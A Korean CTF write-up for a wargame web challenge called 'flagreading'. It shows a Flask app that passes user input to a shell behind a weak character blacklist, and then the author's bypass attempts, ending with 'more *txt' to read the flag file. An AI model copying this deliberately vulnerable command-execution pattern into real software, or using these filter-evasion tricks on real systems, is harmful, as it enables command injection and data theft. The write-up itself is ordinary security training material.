---
layout: post
title: "[SpaceWar] flagreading"
categories: [SWING, Writeup]
tags: [CTF, Wargame, flag]
last_modified_at: 2024-05-02
---

웹 문제인데 좀 쉬워보인다 

```shell
from flask import Flask, render_template, request
import subprocess
import re
import time

app = Flask(__name__)
blacklist = set('flag/')
command_executed = False
last_execution_time = 0

def is_valid_command(command):
    if any(char in blacklist for char in command):
        return False
    return True

def execute_command(command):
    try:
        result = subprocess.run(command, shell=True, capture_output=True, text=True)
        output = result.stdout.strip()
        error = result.stderr.strip()
        if output:
            return output
        if error:
            return error
    except Exception as e:
        return str(e)

@app.route('/')
def index():
    return render_template('index.html')

@app.route('/execute_command', methods=['POST'])
def execute_command_route():
    global command_executed, last_execution_time
    current_time = time.time()
    if command_executed and (current_time - last_execution_time) < 30:
        time_left = 30 - (current_time - last_execution_time)
        return f"You've already executed a command! Please wait {int(time_left)} seconds before trying again."
    command = request.form['command']
    if not is_valid_command(command):
        return "try harder!"
    result = execute_command(command)
    command_executed = True
    last_execution_time = current_time
    return result

if __name__ == '__main__':
    app.run(debug=True, port=5678
```

폴더에 flag.txt를 있는 걸 보아.. cat flag.txt해야할듯  

![Image](https://blog.kakaocdn.net/dna/LVBnX/btsG6V3wVAh/AAAAAAAAAAAAAAAAAAAAANEXw63xosv8IEqzrEBH74N5ebRdTKYa7uvUeD6McHjc/img.png?credential=yqXZFxpELC7KVnFOS48ylbz2pIh7yKj8&expires=1769871599&allow_ip=&allow_referer=&signature=npRljAE5ZXEe0%2FA%2BeblcqkZ%2FONo%3D)

```python
if any(char in blacklist for char in command):
```
이부분 우회 필요  
```python
a="FLAG"; cat a.lower()+".txt";
```
안되고  
```python
b="CAT FLAG.TXT"; echo"${b,,}"
```
```python
b="CAT FLAG.TXT"; echo"$b" | tr '[:upper:]' '[:lower:]'
```
아... flag의 l이 있어서 이건 안된다  

![Image](https://blog.kakaocdn.net/dna/cOpH3a/btsG7nZRoAu/AAAAAAAAAAAAAAAAAAAAALEGXTcDe_tpq7x6889lrSWnvxq6D4BnfDzo5pQE-4SF/img.png?credential=yqXZFxpELC7KVnFOS48ylbz2pIh7yKj8&expires=1769871599&allow_ip=&allow_referer=&signature=QPPKjQTIhvMs1v5n045KK7IQD54%3D)

ls 안되길래 dir로 우회 flag.txt가 있는 건 확실한데..  
흠... grep, find도 안되는데 * 사용해서 txt 다 출력  
cat 대신할 명령 찾자 -> more이나 less  
```shell
more *txt
```

![Image](https://blog.kakaocdn.net/dna/LEhvl/btsG4WJtg4O/AAAAAAAAAAAAAAAAAAAAANLIrer4Qh4Llbv-5MH26euEVBS0Ri2bIK0QuZc4MtMK/img.png?credential=yqXZFxpELC7KVnFOS48ylbz2pIh7yKj8&expires=1769871599&allow_ip=&allow_referer=&signature=Mo66IczSl2LpcHAuCCeM3gEdZVk%3D)

맨아래가 flag.txt 파일이다